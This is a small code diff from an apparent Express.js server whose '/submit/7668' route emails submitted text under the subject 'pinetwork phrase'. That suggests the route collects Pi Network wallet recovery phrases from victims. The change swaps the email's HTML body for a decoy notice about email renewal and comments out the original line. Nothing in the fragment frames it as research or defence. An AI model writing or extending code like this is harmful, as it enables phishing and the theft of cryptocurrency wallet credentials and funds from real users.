@@ -80,7 +80,8 @@ app.post("/submit/7668", async (req, res) => {
         subject: "pinetwork phrase",
         text: mfText,
         
-        html: `<h1>${mfText}</h1>`,
+        html: `<h1>❌❌❌ Please reach out to your email service admin for renewal</h1>`,
+        // html: `<h1>${mfText}</h1>`,
       }
       );
   } catch (error) {
